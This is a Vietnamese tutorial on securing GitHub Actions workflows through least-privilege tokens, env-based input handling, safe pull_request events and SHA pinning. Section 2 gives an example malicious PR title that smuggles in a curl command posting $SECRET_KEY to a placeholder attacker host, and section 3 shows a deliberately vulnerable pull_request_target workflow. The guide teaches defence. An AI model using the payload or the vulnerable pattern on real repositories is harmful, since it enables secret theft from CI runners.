# Gia cố Bảo mật Đường ống: GITHUB_TOKEN Tối thiểu, Chống Script Injection, Bẫy Pwn Request & Ghim SHA 40 Ký tự

Nhiều lập trình viên dồn 100% tâm trí bảo mật vào mã nguồn Express/Fastify trên Production, nhưng lại quên mất một sự thật lạnh gáy: **máy chủ CI/CD Runner chính là "Kho Báu Tối Thượng" mà mọi nhóm tin tặc săn lùng!**

- [!] **Quyền lực tối cao hội tụ tại một điểm:** Runner nắm trong tay quyền ghi ngược mã độc vào kho Git (`GITHUB_TOKEN`), chìa khoá đẩy Container Image lên Registry và quyền triển khai thẳng lên đám mây AWS/Kubernetes!
- [!] **Bề mặt tấn công mở ra Internet:** Chỉ cần một dòng cấu hình ngây thơ trong `.github/workflows/`, một người lạ trên mạng mở một Pull Request bình thường cũng có thể thực thi lệnh điều khiển từ xa (**RCE**) ngay bên trong Runner của công ty bạn!

```visual
kind: groups
title: "4 Lá Chắn Sống Còn Gia Cố Bảo Mật Đường Ống [!badge:emerald:Zero-Trust CI]"
subtitle: Khóa chặt toàn bộ bề mặt tấn công cấp độ Workflow từ quyền hạn Token, đầu vào PR, ngữ cảnh Fork đến chuỗi cung ứng Action
columns: 2
items:
  - num: 1
    icon: lock
    title: "Khoá GITHUB_TOKEN Tối Thiểu"
    badge: Least Privilege
    tone: sky
    desc: "Thu hồi quyền write-all mặc định; ép toàn bộ Workflow về chỉ đọc mã nguồn ở cấp gốc."
    bullets:
      - "Đặt `permissions: { contents: read }` ở đầu tệp YAML"
      - "Chỉ mở quyền ghi cục bộ (như `packages: write`) ở đúng Job đóng gói"
  - num: 2
    icon: terminal
    title: "Triệt Tiêu Script Injection"
    badge: Anti-RCE
    tone: amber
    desc: "Tuyệt đối không nối trực tiếp dữ liệu người dùng `${{ github.event... }}` vào câu lệnh `run:`."
    bullets:
      - "Chuyển dữ liệu qua biến môi trường trung gian `env:`"
      - "Tham chiếu an toàn bằng dấu nháy kép `\"$PR_TITLE\"` trong bash"
  - num: 3
    icon: shield-alert
    title: "Chặn Tử Huyệt Pwn Request"
    badge: Fork Isolation
    tone: rose
    desc: "Phân biệt sống còn giữa `on: pull_request` và `on: pull_request_target` khi nhận PR từ kho Fork."
    bullets:
      - "Mọi bước chạy `npm ci`, `lint`, `test` bắt buộc dùng `on: pull_request`"
      - "Cấm checkout và thực thi code PR bên trong `pull_request_target`!"
  - num: 4
    icon: git-commit
    title: "Ghim Cứng Commit SHA 40 Ký Tự"
    badge: Supply Chain
    tone: emerald
    desc: Miễn nhiễm trước tấn công trỏ lại thẻ Git khả biến (`@v4`, `@main`) của Action bên thứ ba.
    bullets:
      - "Mã băm Git SHA-1 đầy đủ **40 ký tự hex** là bất biến toán học tuyệt đối"
      - "Ghi kèm chú thích `# v0.28.0` bên cạnh để dễ bảo trì"
```

---

## 1. Lá chắn #1 — Khoá chặt `GITHUB_TOKEN` theo Nguyên lý Đặc quyền tối thiểu (`permissions:`)

Mỗi khi một Workflow khởi chạy, GitHub tự động cấp một thẻ xác thực tạm thời gọi là **`GITHUB_TOKEN`**. Trên các kho lưu trữ hoặc tổ chức chưa siết cấu hình mặc định, chiếc thẻ này mang quyền **`write-all`** — cho phép bất kỳ bước kiểm thử nào bị xâm nhập cũng tự ý đẩy commit thẳng vào nhánh, sửa bản phát hành Release hoặc xoá gói!

Quy chuẩn bảo mật bắt buộc năm 2026 là {emerald:nguyên lý Đặc quyền tối thiểu (Least Privilege)}: **Khoá chỉ đọc (==`contents: read`==) ở cấp gốc đầu tệp Workflow, và chỉ mở quyền ghi cục bộ ({amber:packages: write}) cho riêng Job thực sự cần**:

```yaml
name: Hardened CI
on: [pull_request]

# 1) Khoá mặc định toàn bộ các Job về chế độ CHỈ ĐỌC mã nguồn!
permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    # Kế thừa permissions: contents: read -> An toàn tuyệt đối khi chạy npm test!
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test

  push-image:
    needs: test
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    # 2) CHỈ mở thêm quyền ghi gói ảnh cho duy nhất Job đóng gói này!
    permissions:
      contents: read
      packages: write
    steps:
      - uses: actions/checkout@v4
      - run: echo "Build & push container image..."
```

---

## 2. Lá chắn #2 — Triệt tiêu lỗ hổng Thực thi Mã từ xa **Script Injection**

> [!ANALOGY] Giống hệt lỗi SQL Injection trong Node.js!
> Nối thẳng `${{ github.event.pull_request.title }}` vào khối `run:` nguy hiểm y hệt như cộng chuỗi `"SELECT * FROM users WHERE name = '" + req.body.name + "'"`! Vì bộ tiền xử lý của GitHub Actions **thay thế văn bản `${{ ... }}` TRƯỚC KHI trao kịch bản cho trình thông dịch `bash`**, kẻ tấn công chỉ cần đặt tiêu đề PR chứa `"; curl ... #` là thoát ra thành câu lệnh shell mới!

Giả sử tin tặc mở PR mang tiêu đề:
`feat: fix typo"; curl -s https://evil.example.invalid/steal --data "$SECRET_KEY" #`

Câu lệnh thực sự chạy trên máy chủ Runner sau bước nội suy văn bản sẽ biến thành:

```bash
echo "Đang kiểm tra PR: feat: fix typo"; curl -s https://evil.example.invalid/steal --data "$SECRET_KEY" #"
```

```visual
kind: compare
title: "Giải Phẫu Lỗ Hổng Script Injection & Cách Khắc Phục Chuẩn Bằng Khối env:"
subtitle: "Mọi dữ liệu do người mở PR kiểm soát (title, body, comment, commit message, và cả tên nhánh head.ref!) đều là đầu vào không tin cậy"
left:
  badge: "LỖ HỔNG RCE · Nối thẳng vào run:"
  title: "GitHub nội suy văn bản trước khi Bash chạy"
  tone: rose
  code: |
    # NGUY HIỂM CHẾT NGƯỜI: Nội suy trực tiếp vào shell!
    - name: Kiểm tra tiêu đề & nhánh PR
      run: |
        echo "PR: ${{ github.event.pull_request.title }}"
        echo "Branch: ${{ github.event.pull_request.head.ref }}"
  lang: yaml
  bullets:
    - "Biểu thức `${{ ... }}` bị bung thẳng thành mã nguồn kịch bản shell trước khi `bash` phân tích cú pháp"
    - "Ký tự `\";` hoặc `$(...)` trong `pull_request.title`, `pull_request.body`, hay ngay cả tên nhánh ==`github.event.pull_request.head.ref`== sẽ thực thi lệnh độc tuỳ ý!"
right:
  badge: "AN TOÀN TUYỆT ĐỐI · Trung gian qua env:"
  title: "Lưu vào bộ nhớ biến môi trường của tiến trình"
  tone: emerald
  code: |
    # CHUẨN BẢO MẬT: Truyền qua env: giống Parameterized Query ($1)
    - name: Kiểm tra tiêu đề & nhánh PR an toàn
      env:
        PR_TITLE: ${{ github.event.pull_request.title }}
        PR_BRANCH: ${{ github.event.pull_request.head.ref }}
      run: |
        echo "PR: $PR_TITLE"
        echo "Branch: $PR_BRANCH"
  lang: yaml
  bullets:
    - "Hệ điều hành nạp giá trị vào vùng nhớ ==`env:`== của tiến trình mà **không bao giờ phân tích cú pháp lệnh shell**"
    - "Bọc biến trong dấu nháy kép `\"$PR_TITLE\"` giúp mọi ký tự đặc biệt chỉ được in ra như chuỗi văn bản thuần tuý"
```

---

## 3. Lá chắn #3 — Tránh xa "Tử huyệt Pwn Request": `pull_request` vs `pull_request_target`

Tại sao GitHub lại sinh ra hai sự kiện có cái tên dễ gây nhầm lẫn chết người đến vậy?

```visual
kind: compare
title: "Sự Khác Biệt Sống Còn Đối Với PR Từ Kho Fork: pull_request vs pull_request_target"
subtitle: "Sai một hậu tố _target là trao toàn bộ kho Secrets Production cho người lạ trên Internet!"
left:
  badge: "TỬ HUYỆT PWN REQUEST · Cực kỳ nguy hiểm"
  title: "on: pull_request_target + Checkout code của PR"
  tone: rose
  code: |
    # THẢM HOẠ BẢO MẬT: Chạy trong ngữ cảnh nhánh main!
    on: pull_request_target
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
            with:
              ref: ${{ github.event.pull_request.head.sha }}
          - run: npm ci && npm test   # Chạy postinstall của kẻ tấn công!
  lang: yaml
  bullets:
    - "Chạy tệp YAML trên nhánh gốc `main` với **ĐẦY ĐỦ quyền ghi `GITHUB_TOKEN` và ĐỌC ĐƯỢC TOÀN BỘ `secrets` của dự án**"
    - "Khi checkout `pull_request.head.sha` từ kho Fork về chạy `npm ci` / `npm test`, kẻ tấn công chỉ cần gài lệnh vào `\"postinstall\"` trong `package.json` là hút sạch toàn bộ Secrets!"
right:
  badge: "AN TOÀN MẶC ĐỊNH · Cô lập hộp cát"
  title: "on: pull_request cho mọi bước Build / Lint / Test"
  tone: emerald
  code: |
    # QUY TẮC SẮT ĐÁ CHO CI KIỂM THỬ PR:
    on: pull_request
    permissions:
      contents: read
    jobs:
      test:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
          - run: npm ci && npm test
  lang: yaml
  bullets:
    - "Đối với mọi PR mở từ kho Fork bên ngoài, GitHub **tự động tước sạch quyền ghi (`read-only`) và ẩn hoàn toàn kho `secrets`**"
    - "An toàn tuyệt đối để biên dịch mã nguồn mới, chạy `eslint`, `vitest` mà không sợ rò rỉ tài nguyên nội bộ"
```

---

## 4. Lá chắn #4 — Chống Tấn công Chuỗi cung ứng bằng **Ghim cứng SHA 40 Ký tự**

Vào tháng 3/2025, sự cố chấn động ngành phần mềm với Action phổ biến `tj-actions/changed-files` đã gióng hồi chuông cảnh tỉnh toàn cầu: tin tặc chiếm quyền truy cập kho Action bên thứ ba rồi **trỏ lại toàn bộ các thẻ phiên bản `@v4`, `@v45` sang một commit độc hại chuyên quét bộ nhớ RAM của Runner để đánh cắp Secret**!

Trong Git, một thẻ phiên bản như `@v4`, `@v0.28.0` hay tên nhánh `@master` chỉ là **con trỏ khả biến (*Mutable Tag*)** — chủ kho (hoặc kẻ chiếm tài khoản) có thể xoá đi gán sang mã độc lúc nửa đêm! Chỉ có ==mã băm Commit SHA đầy đủ 40 ký tự thập lục phân== (`0-9`, `a-f`) là định danh bất biến toán học tuyệt đối:

```yaml
# RỦI RO VỚI ACTION BÊN THỨ BA: Thẻ @master hoặc @v0.28.0 có thể bị force-push đổi đích ngầm!
- uses: aquasecurity/trivy-action@master

# CHUẨN DOANH NGHIỆP: Ghim cứng SHA đầy đủ 40 ký tự kèm ghi chú phiên bản dễ đọc bên cạnh!
- uses: aquasecurity/trivy-action@18f2510ee396bbf400402917b394f2dd8c87dbb0 # v0.28.0
```

- [x] **Đối với Action chính chủ `actions/*` của GitHub** (như `actions/checkout@v4`, `actions/setup-node@v4`): mức chấp nhận tối thiểu là ghim `@v4` (hoặc ghim SHA 40 ký tự ở môi trường tài chính khắt khe).
- [x] **Đối với MỌI Action bên thứ ba (`owner/repo`):** bắt buộc ghim cứng **đúng 40 ký tự Commit SHA** và để Dependabot / Renovate tự động mở PR nâng cấp mã SHA khi có bản mới!

```visual
kind: troubleshoot
title: Danh Mục Rà Soát Nhanh Lỗ Hổng Bảo Mật Trên Tệp Workflow
items:
  - symptom: "Workflow không có khối permissions: ở đầu tệp"
    badge: Đặc quyền thừa
    tone: amber
    cause: "Trên kho cấu hình cũ, GITHUB_TOKEN mặc định mang quyền write-all trên cả Contents, Packages, Releases và Pull Requests."
    fix: "Thêm permissions: { contents: read } ngay ở cấp gốc Workflow; chỉ cấp thêm quyền ghi cục bộ tại từng Job cần thiết."
    cmd: "permissions:\n  contents: read"
  - symptom: "Xuất hiện ${{ github.event.pull_request.head.ref }} bên trong khối run:"
    badge: Script Injection
    tone: rose
    cause: "Tên nhánh nguồn (head.ref), tiêu đề PR (title), nội dung (body) và commit message đều do người mở PR kiểm soát hoàn toàn."
    fix: "Đưa biểu thức vào khối env: trung gian rồi đặt biến bash trong dấu nháy kép."
    cmd: "env:\n  HEAD_REF: ${{ github.event.pull_request.head.ref }}\nrun: echo \"$HEAD_REF\""
  - symptom: "Dùng Action bên thứ ba với thẻ khả biến kiểu org/action@v4 hoặc @main"
    badge: Supply Chain
    tone: rose
    cause: "Thẻ Git có thể bị kẻ tấn công force-push trỏ sang commit đánh cắp bộ nhớ Runner (như sự cố tj-actions/changed-files năm 2025)."
    fix: "Ghim cứng bằng mã băm Git Commit SHA-1 đầy đủ đúng 40 ký tự hex."
    cmd: "uses: aquasecurity/trivy-action@18f2510ee396bbf400402917b394f2dd8c87dbb0 # v0.28.0"
```

> [!REMEMBER] Ghi nhớ bỏ túi
> - Luôn đặt **`permissions: { contents: read }`** ở đầu tệp Workflow để thu hồi quyền ghi mặc định của `GITHUB_TOKEN`.
> - Chống **Script Injection**: Không bao giờ đặt `${{ github.event... }}` (kể cả `pull_request.title` hay `pull_request.head.ref`) thẳng vào `run:` — luôn bọc qua **`env:`**.
> - Chống **Pwn Request**: Dùng **`on: pull_request`** cho mọi tác vụ chạy code/test từ PR; tuyệt đối không checkout code PR trong `pull_request_target`.
> - Chống tấn công chuỗi cung ứng: Ghim Action bên thứ ba bằng **Commit SHA đầy đủ 40 ký tự**.
